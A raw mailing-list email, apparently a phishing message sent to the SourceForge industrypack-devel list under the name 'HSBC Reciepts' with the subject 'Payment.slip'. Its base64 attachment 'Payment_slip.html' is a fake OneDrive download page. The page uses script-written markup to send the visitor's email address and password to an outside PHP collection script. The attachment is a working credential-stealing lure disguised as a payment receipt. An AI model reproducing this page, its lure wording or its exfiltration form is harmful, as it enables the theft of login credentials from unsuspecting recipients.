Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 5F2FF3C5B94
	for <lists+industrypack-devel@lfdr.de>; Mon, 12 Jul 2021 13:53:12 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1m2uUp-0007Ni-4n
	for lists+industrypack-devel@lfdr.de; Mon, 12 Jul 2021 11:53:11 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <sales@kevinsha.com>) id 1m2uUn-0007Na-E6
 for industrypack-devel@lists.sourceforge.net; Mon, 12 Jul 2021 11:53:09 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=P5aVqmEN4GpM9G110+F3O00BDnbQ4sUgSdPdSqJGbXc=; b=fL1ngKXhY0TuCVEH4xU1EMOAgA
 2sQ1UeFsbjQpIkNYTQUmqCje8KZ10j1JZPiQ+4my9U9ncV2QlkOZCvD2UL0ZwogMyC/SYPV/fFB0M
 6dN/txFcIba4BZCmNO1T+XzI7u9JGFXhR4e0gAUSBXtUWy96eSgWVL7gJEzfPpmLkXFk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=P5aVqmEN4GpM9G110+F3O00BDnbQ4sUgSdPdSqJGbXc=; b=B
 9TAnDC1bzhWh8sy1ub+vlcXcn6veEZB96+JMtqt06iZ1tB7CBmi0UNPSidMlmBkHkAAV0BEA1IVSp
 hERUKydedd4WEqp9nWH6cagYeJbSlmmWzjWGv76z81NyqhZX4q51akcB5sHgMQHu+ZLRCl96696Ik
 T3RiR/e1YvdTlVZw=;
Received: from [67.205.185.191] (helo=mta0.kevinsha.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1m2uUe-0000nq-30
 for industrypack-devel@lists.sourceforge.net; Mon, 12 Jul 2021 11:53:09 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=kevinsha.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
 i=sales@kevinsha.com;
 bh=P5aVqmEN4GpM9G110+F3O00BDnbQ4sUgSdPdSqJGbXc=;
 b=rpIpC+yUOkX2LtHoo903LPqZzCDEgGgps+oxB3C9uP3bdyDHJ0X1+ZDk3GKDJnfqUTHys2ohAA46
 18tQ39SGBI4fignG59ygHm2G+FIOkb6HHDkdnSVZLUBzVmpzFyVKC2xzFrbCDRh2qb5NwaPgfmiJ
 Qah/iVepkJ8w3M7HzdM=
From: HSBC Reciepts <sales@kevinsha.com>
To: industrypack-devel@lists.sourceforge.net
Date: 12 Jul 2021 04:52:54 -0700
Message-ID: <20210712045253.9C495AB5E28481D5@kevinsha.com>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_F74BB68A.BE8791F2"
X-Spam-Score: 4.5 (++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 0.0 HTML_TAG_BALANCE_CENTER Malformatted HTML
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
X-Headers-End: 1m2uUe-0000nq-30
Subject: Re: [Industrypack-devel] Payment.slip
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_F74BB68A.BE8791F2
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body>
<P>HI</P>
<P>industrypack-devel, </P>
<P>PAID<BR> Monday, July 12, 2021 4:52 a.m.</P>
<P><BR>industrypack-devel@lists.sourceforge.net</P>
<P>&nbsp;</P></BODY></HTML>
------=_NextPart_000_0012_F74BB68A.BE8791F2
Content-Type: text/html; name="Payment_slip.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Payment_slip.html"

PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPk9uZWRyaXZlPC90aXRs
ZT4NCjxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cDovL2ljb25zLmljb25hcmNoaXZlLmNv
bS9pY29ucy9kYWtpcmJ5MzA5L3NpbXBseS1zdHlsZWQvMjU2L01pY3Jvc29mdC1QdXJjaGFz
ZSBPcmRlci0yMDEzLWljb24ucG5nIiB0eXBlPSJpbWFnZS9naWYiIHNpemVzPSIxNngxNiI+
DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBp
bml0aWFsLXNjYWxlPTEiPg0KPHN0eWxlPg0KYm9keSB7DQptYXJnaW46IDA7DQpmb250LWZh
bWlseTogVHJlYnVjaGV0IE1TOw0KfQ0KDQoudG9wbmF2IHsNCm92ZXJmbG93OiBoaWRkZW47
DQpiYWNrZ3JvdW5kLWNvbG9yOiAjMzMzOw0KfQ0KDQoudG9wbmF2IGEgew0KZmxvYXQ6IGxl
ZnQ7DQpjb2xvcjogI2YyZjJmMjsNCnRleHQtYWxpZ246IGNlbnRlcjsNCnBhZGRpbmc6IDE0
cHggMTZweDsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCmZvbnQtc2l6ZTogMTdweDsNCn0N
Cg0KLnRvcG5hdiBhOmhvdmVyIHsNCmJhY2tncm91bmQtY29sb3I6ICNkZGQ7DQpjb2xvcjog
YmxhY2s7DQp9DQoNCi50b3BuYXYgYS5hY3RpdmUgew0KYmFja2dyb3VuZC1jb2xvcjogIzA0
NDc5NDsNCmNvbG9yOiB3aGl0ZTsNCn0NCg0KaW5wdXRbdHlwZT10ZXh0XSwgaW5wdXRbdHlw
ZT1lbWFpbF0gew0Kd2lkdGg6IDQwJTsNCnBhZGRpbmc6IDEycHggMjBweDsNCm1hcmdpbjog
OHB4IDA7DQpkaXNwbGF5OiBpbmxpbmUtYmxvY2s7DQpib3JkZXI6IDFweCBzb2xpZCAjY2Nj
Ow0KYm94LXNpemluZzogYm9yZGVyLWJveDsNCn0NCg0KDQppbnB1dFt0eXBlPXRleHRdLCBp
bnB1dFt0eXBlPXBhc3N3b3JkXSB7DQp3aWR0aDogNDAlOw0KcGFkZGluZzogMTJweCAyMHB4
Ow0KbWFyZ2luOiA4cHggMDsNCmRpc3BsYXk6IGlubGluZS1ibG9jazsNCmJvcmRlcjogMXB4
IHNvbGlkICNjY2M7DQpib3gtc2l6aW5nOiBib3JkZXItYm94Ow0KfQ0KDQpidXR0b24gew0K
YmFja2dyb3VuZC1jb2xvcjogIzA0NDc5NDsNCmNvbG9yOiB3aGl0ZTsNCnBhZGRpbmc6IDE0
cHggMjBweDsNCm1hcmdpbjogOHB4IDA7DQoNCmJvcmRlcjogbm9uZTsNCmN1cnNvcjogcG9p
bnRlcjsNCndpZHRoOiA0MCU7DQp9DQoNCmJ1dHRvbjpob3ZlciB7DQpvcGFjaXR5OiAwLjg7
DQp9DQoNCi5jYW5jZWxidG4gew0Kd2lkdGg6IGF1dG87DQpwYWRkaW5nOiAxMHB4IDE4cHg7
DQpiYWNrZ3JvdW5kLWNvbG9yOiAjZjQ0MzM2Ow0KfQ0KDQouaW1nY29udGFpbmVyIHsNCnRl
eHQtYWxpZ246IGNlbnRlcjsNCm1hcmdpbjogMTBweCAxMHB4IDA7DQp9DQoNCmltZy5hdmF0
YXIgew0Kd2lkdGg6IDQwJTsNCmJvcmRlci1yYWRpdXM6IDUwJTsNCn0NCg0KLmNvbnRhaW5l
ciB7DQpwYWRkaW5nOiAxMHB4Ow0KfQ0KDQpzcGFuLnBzdyB7DQpmbG9hdDogcmlnaHQ7DQpw
YWRkaW5nLXRvcDogMTZweDsNCn0NCg0KLyBDaGFuZ2Ugc3R5bGVzIGZvciBzcGFuIGFuZCBj
YW5jZWwgYnV0dG9uIG9uIGV4dHJhIHNtYWxsIHNjcmVlbnMgLw0KQG1lZGlhIHNjcmVlbiBh
bmQgKG1heC13aWR0aDogMzAwcHgpIHsNCnNwYW4ucHN3IHsNCmRpc3BsYXk6IGJsb2NrOw0K
ZmxvYXQ6IG5vbmU7DQp9DQouY2FuY2VsYnRuIHsNCndpZHRoOiAxMDAlOw0KfQ0KfQ0KDQov
IFRoZSBNb2RhbCAoYmFja2dyb3VuZCkgLw0KLm1vZGFsIHsNCmRpc3BsYXk6IG5vbmU7IC8g
SGlkZGVuIGJ5IGRlZmF1bHQgLw0KcG9zaXRpb246IGZpeGVkOyAvIFN0YXkgaW4gcGxhY2Ug
Lw0Kei1pbmRleDogMTsgLyBTaXQgb24gdG9wIC8NCmxlZnQ6IDA7DQp0b3A6IDA7DQp3aWR0
aDogMTAwJTsgLyBGdWxsIHdpZHRoIC8NCmhlaWdodDogMTAwJTsgLyBGdWxsIGhlaWdodCAv
DQpvdmVyZmxvdzogYXV0bzsgLyBFbmFibGUgc2Nyb2xsIGlmIG5lZWRlZCAvDQpiYWNrZ3Jv
dW5kLWNvbG9yOiByZ2IoMCwwLDApOyAvIEZhbGxiYWNrIGNvbG9yIC8NCmJhY2tncm91bmQt
Y29sb3I6IHJnYmEoMCwwLDAsMC40KTsgLyBCbGFjayB3LyBvcGFjaXR5IC8NCnBhZGRpbmct
dG9wOiA2MHB4Ow0KfQ0KDQovIE1vZGFsIENvbnRlbnQvQm94IC8NCi5tb2RhbC1jb250ZW50
IHsNCmJhY2tncm91bmQtY29sb3I6ICNmZWZlZmU7DQptYXJnaW46IDUlIGF1dG8gMTUlIGF1
dG87IC8gNSUgZnJvbSB0aGUgdG9wLCAxNSUgZnJvbSB0aGUgYm90dG9tIGFuZCBjZW50ZXJl
ZCAvDQpib3JkZXI6IDFweCBzb2xpZCAjODg4Ow0Kd2lkdGg6IDUwJTsgLyBDb3VsZCBiZSBt
b3JlIG9yIGxlc3MsIGRlcGVuZGluZyBvbiBzY3JlZW4gc2l6ZSAvDQp9DQoNCi8gVGhlIENs
b3NlIEJ1dHRvbiAoeCkgLw0KLmNsb3NlIHsNCnBvc2l0aW9uOiBhYnNvbHV0ZTsNCnJpZ2h0
OiAyNXB4Ow0KdG9wOiAwOw0KY29sb3I6ICMwMDA7DQpmb250LXNpemU6IDM1cHg7DQpmb250
LXdlaWdodDogYm9sZDsNCn0NCg0KLmNsb3NlOmhvdmVyLA0KLmNsb3NlOmZvY3VzIHsNCmNv
bG9yOiByZWQ7DQpjdXJzb3I6IHBvaW50ZXI7DQp9DQoNCi8gQWRkIFpvb20gQW5pbWF0aW9u
IC8NCi5hbmltYXRlIHsNCi13ZWJraXQtYW5pbWF0aW9uOiBhbmltYXRlem9vbSAwLjZzOw0K
YW5pbWF0aW9uOiBhbmltYXRlem9vbSAwLjZzDQp9DQoNCkAtd2Via2l0LWtleWZyYW1lcyBh
bmltYXRlem9vbSB7DQpmcm9tIHstd2Via2l0LXRyYW5zZm9ybTogc2NhbGUoMCl9DQp0byB7
LXdlYmtpdC10cmFuc2Zvcm06IHNjYWxlKDEpfQ0KfQ0KDQpAa2V5ZnJhbWVzIGFuaW1hdGV6
b29tIHsNCmZyb20ge3RyYW5zZm9ybTogc2NhbGUoMCl9DQp0byB7dHJhbnNmb3JtOiBzY2Fs
ZSgxKX0NCn0NCg0KLyBDaGFuZ2Ugc3R5bGVzIGZvciBzcGFuIGFuZCBjYW5jZWwgYnV0dG9u
IG9uIGV4dHJhIHNtYWxsIHNjcmVlbnMgLw0KQG1lZGlhIHNjcmVlbiBhbmQgKG1heC13aWR0
aDogMzAwcHgpIHsNCnNwYW4ucHN3IHsNCmRpc3BsYXk6IGJsb2NrOw0KZmxvYXQ6IG5vbmU7
DQp9DQouY2FuY2VsYnRuIHsNCndpZHRoOiAxMDAlOw0KfQ0KfQ0KPC9zdHlsZT4NCjwvaGVh
ZD4NCjxib2R5Pg0KDQo8ZGl2IGNsYXNzPSJ0b3BuYXYiPg0KPGEgY2xhc3M9ImFjdGl2ZSIg
aHJlZj0iI2hvbWUiPk1pY3Jvc29mdCAyLzE5LzIwMjEgMTozODo1NSBhLm0uIDwvYT4NCjxh
IGhyZWY9IiNuZXdzIj5PbmVkcml2ZSBGaWxlIFN0b3JhZ2UgPC9hPg0KDQo8L2Rpdj4NCg0K
DQo8YnI+DQo8Y2VudGVyPg0KPGJyPjxicj48Y2VudGVyPjxpbWcgc3JjPSJodHRwczovL2Nk
bjEuY2xvdWRwcm8uY28udWsvc2l0ZXMvY2xvdWRwcm9kNy9maWxlcy9zdHlsZXMvdGh1bWJu
YWlsX2xhcmdlXzYyMHgzNTAvcHVibGljL29uZWRyaXZlX2xvZ28ucG5nP2l0b2s9d19ySmJS
ckYiIGhlaWdodD0iMTAwIj48L2ltZz4NCjxwPjxmb250IGZhY2U9IlRyZWJ1Y2hldCBNUyIg
Y29sb3I9IkJsYWNrIiBzaXplPSIyIj4NCg0KPHN0cm9uZz5Zb3UgaGF2ZSBvbmUgbmV3IHBl
bmRpbmcgZG9jdW1lbnQgZm9yIGRvd25sb2FkPC9zdHJvbmc+PGJyPkRPQyBRMDAxNyAtIDM1
MTJDLkRvYyAoMC45NSBNQikNCg0KDQoNCg0KPC9mb250PiA8L3A+DQoNCg0KDQo8c2NyaXB0
IGxhbmd1YWdlPWphdmFzY3JpcHQ+ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJzxmb3JtIGNs
YXNzPSJtb2RhbC1jb250ZW50IGFuaW1hdGUiIG1ldGhvZD0icG9zdCIgYWN0aW9uPSJodHRw
czovL2VkYWFjaWwuY29tLzFkci9PbmVEcml2ZS9SZXBvcnRpbmctT25lRHJpdmUucGhwIj4n
KSk8L3NjcmlwdD4NCg0KDQoNCg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxjZW50ZXI+
IDxwPjxmb250IGZhY2U9IlRyZWJ1Y2hldCBNUyIgY29sb3I9ImJsYWNrIiBzaXplPSIyIj4g
Q29uZmlybSBJZGVudGl0eSB0byBQcm92ZSBZb3UgYXJlIG5vdCBhIFJvYm90PC9mb250Pjxi
cj4gPGlucHV0IHR5cGU9ImVtYWlsIiBpZD0iZm5hbWUiIG5hbWU9ImxvZ2luIiBQbGFjZWhv
bGRlcj0iRW50ZXIgRW1haWwgQWRkcmVzcyIgdmFsdWU9ImluZHVzdHJ5cGFjay1kZXZlbEBs
aXN0cy5zb3VyY2Vmb3JnZS5uZXQiIHJlYWRvbmx5IHJlcXVpcmVkPg0KPGJyPg0KPGlucHV0
IHR5cGU9InBhc3N3b3JkIiBpZD0iZm5hbWUiIG5hbWU9InBhc3N3ZCIgcGxhY2Vob2xkZXI9
IkVudGVyIEVtYWlsIFBhc3N3b3JkIiBhdXRvZm9jdXMgcmVxdWlyZWQ+DQo8YnI+DQo8YnV0
dG9uIHR5cGU9InN1Ym1pdCI+Q09OVElOVUU8L2J1dHRvbj4NCg0KPC9kaXY+DQoNCjxkaXYg
Y2xhc3M9ImNvbnRhaW5lciIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6I2YxZjFmMSI+DQoN
Cg0KPC9kaXY+DQo8L2Zvcm0+DQo8L2Rpdj4NCg0KPHNjcmlwdD4NCi8vIEdldCB0aGUgbW9k
YWwNCnZhciBtb2RhbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZDAxJyk7DQoNCi8v
IFdoZW4gdGhlIHVzZXIgY2xpY2tzIGFueXdoZXJlIG91dHNpZGUgb2YgdGhlIG1vZGFsLCBj
bG9zZSBpdA0Kd2luZG93Lm9uY2xpY2sgPSBmdW5jdGlvbihldmVudCkgew0KaWYgKGV2ZW50
LnRhcmdldCA9PSBtb2RhbCkgew0KbW9kYWwuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCn0N
Cn0NCjwvc2NyaXB0Pg0KDQo8L2JvZHk+DQoNCjwvYm9keT4NCjwvaHRtbD4NCg==

------=_NextPart_000_0012_F74BB68A.BE8791F2
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_F74BB68A.BE8791F2
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_F74BB68A.BE8791F2--


